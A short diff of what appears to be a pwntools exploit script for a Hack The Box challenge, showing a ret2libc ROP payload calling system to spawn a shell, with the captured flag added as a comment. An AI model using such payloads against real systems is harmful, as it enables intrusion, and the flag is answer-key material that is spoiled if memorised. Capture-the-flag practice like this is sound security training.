@@ -65,3 +65,5 @@ payload = ret+pop_rdi+str_bin+p64(libc.sym['system'])
 #payload = 'A'*32  #debug
 io.sendline(payload)
 io.interactive()
+
+#HTB{sh0u1d_h4v3-CH3ck3d_r34D-R3tUrn_v4l_:^)}
